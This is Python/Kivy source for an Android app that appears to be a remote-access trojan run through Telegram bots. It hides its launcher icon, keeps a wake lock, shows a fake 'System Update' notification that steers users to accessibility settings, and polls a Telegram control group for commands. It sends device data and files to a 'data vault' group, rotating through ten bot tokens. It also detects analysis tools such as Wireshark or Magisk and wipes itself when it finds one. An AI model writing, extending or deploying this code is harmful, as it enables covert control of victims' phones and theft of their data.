import os
import time
import random
import base64
import shutil
import threading
import requests
from jnius import autoclass
from kivy.app import App
from kivy.clock import Clock

CMD_GROUP_ID = os.environ.get('TELEGRAM_CONTROL_CENTER_ID')
DATA_GROUP_ID = os.environ.get('TELEGRAM_DATA_VAULT_ID')

BOT_TOKENS = [os.environ.get(f'TELEGRAM_BOT_{i}_TOKEN') for i in range(1, 11)]

class StealthEngine:
    def __init__(self):
        self.device_id = self._generate_device_id()
        self.current_bot_index = 0
        self.identity = "generic"
        self.activity = None
        self.wake_lock = None

    def _generate_device_id(self):
        try:
            Build = autoclass('android.os.Build')
            serial = Build.SERIAL if Build.SERIAL != 'unknown' else str(random.randint(10000, 99999))
            return base64.b64encode(serial.encode()).decode()[:12]
        except:
            return f"DEV{random.randint(1000,9999)}"

    def _get_active_token(self):
        return BOT_TOKENS[self.current_bot_index]

    def _rotate_bot(self):
        self.current_bot_index = (self.current_bot_index + 1) % len(BOT_TOKENS)

    def send_to_vault(self, message=None, file_path=None):
        token = self._get_active_token()
        url_text = f"https://api.telegram.org/bot{token}/sendMessage"
        url_file = f"https://api.telegram.org/bot{token}/sendDocument"
        payload = {"chat_id": DATA_GROUP_ID, "text": f"ID:{self.device_id}\n{message}"}
        try:
            if file_path:
                with open(file_path, 'rb') as f:
                    resp = requests.post(url_file, data={"chat_id": DATA_GROUP_ID}, files={"document": f}, timeout=30)
            else:
                resp = requests.post(url_text, data=payload, timeout=15)
            if resp.status_code != 200:
                self._rotate_bot()
        except:
            self._rotate_bot()

    def fetch_commands(self):
        token = self._get_active_token()
        url = f"https://api.telegram.org/bot{token}/getUpdates"
        try:
            resp = requests.get(url, params={"timeout": 10, "offset": -1}, timeout=15)
            data = resp.json()
            if data.get("result"):
                last_msg = data["result"][-1]["message"]["text"]
                return last_msg
        except:
            self._rotate_bot()
        return None

    def apply_camouflage(self):
        try:
            Build = autoclass('android.os.Build')
            manufacturer = Build.MANUFACTURER.lower()
            if "samsung" in manufacturer:
                self.identity = "samsung"
            elif "xiaomi" in manufacturer or "poco" in manufacturer:
                self.identity = "xiaomi"
            elif "huawei" in manufacturer:
                self.identity = "huawei"
            else:
                self.identity = "generic"
        except:
            self.identity = "generic"

    def hide_presence(self):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            self.activity = PythonActivity.mActivity
            pm = self.activity.getPackageManager()
            component = autoclass('android.content.ComponentName')(
                self.activity.getPackageName(),
                self.activity.getClass().getName()
            )
            pm.setComponentEnabledSetting(component, 2, 1)
        except:
            pass

    def dispatch_notification(self):
        try:
            Context = autoclass('android.content.Context')
            Intent = autoclass('android.content.Intent')
            PendingIntent = autoclass('android.app.PendingIntent')
            NotificationBuilder = autoclass('android.app.Notification$Builder')
            NotificationManager = autoclass('android.app.NotificationManager')
            Settings = autoclass('android.provider.Settings')

            intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            pending_intent = PendingIntent.getActivity(self.activity, 0, intent, PendingIntent.FLAG_IMMUTABLE)

            builder = NotificationBuilder(self.activity)
            builder.setContentTitle("System Update")
            builder.setContentText("Configuration required.")
            builder.setSmallIcon(self.activity.getApplicationInfo().icon)
            builder.setContentIntent(pending_intent)
            builder.setAutoCancel(True)

            mgr = self.activity.getSystemService(Context.NOTIFICATION_SERVICE)
            mgr.notify(1001, builder.build())
        except:
            pass

    def acquire_wakelock(self):
        try:
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')
            PythonService = autoclass('org.kivy.android.PythonService')
            service = PythonService.mService
            pm = service.getSystemService(Context.POWER_SERVICE)
            self.wake_lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Stealth:WakeLock")
            self.wake_lock.acquire()
        except:
            pass

    def audit_security(self):
        try:
            pm = self.activity.getPackageManager()
            targets = ["com.httptoolkit", "org.wireshark", "com.topjohnwu.magisk"]
            for pkg in targets:
                try:
                    pm.getPackageInfo(pkg, 0)
                    self.self_destruct()
                except:
                    continue
        except:
            pass

    def self_destruct(self):
        try:
            self.send_to_vault("SELF_DESTRUCT_TRIGGERED")
            data_dir = self.activity.getFilesDir().getParent()
            if os.path.exists(data_dir):
                shutil.rmtree(data_dir)
            os.system("pm clear " + self.activity.getPackageName())
        except:
            pass
        os._exit(0)

    def cleanup_cache(self):
        try:
            cache_dir = self.activity.getCacheDir()
            for f in cache_dir.listFiles():
                f.delete()
        except:
            pass

    def encrypt_payload(self, data):
        return base64.b64encode(data.encode()).decode()[::-1]

    def decrypt_payload(self, data):
        return base64.b64decode(data[::-1]).decode()

def command_processor(engine):
    engine.send_to_vault(f"ONLINE:{engine.identity}")
    while True:
        try:
            raw = engine.fetch_commands()
            if raw:
                parts = raw.split(':')
                if len(parts) >= 2:
                    target = parts[0]
                    cmd = parts[1]
                    if target == "ALL" or target == engine.device_id:
                        if cmd == "PING":
                            engine.send_to_vault(f"PONG:{engine.device_id}")
                        elif cmd == "SNAP":
                            engine.send_to_vault("📸 Camera capture not implemented")
                        elif cmd == "DIE":
                            engine.self_destruct()
                        elif cmd == "CLEAN":
                            engine.cleanup_cache()
            time.sleep(random.randint(600, 1800))
        except:
            time.sleep(600)

class MainApp(App):
    def build(self):
        self.engine = StealthEngine()
        self.engine.apply_camouflage()
        Clock.schedule_once(self.start_engine, 0.5)
        return None

    def start_engine(self, dt):
        self.engine.hide_presence()
        self.engine.acquire_wakelock()
        self.engine.dispatch_notification()
        threading.Thread(target=command_processor, args=(self.engine,), daemon=True).start()

if __name__ == "__main__":
    MainApp().run()
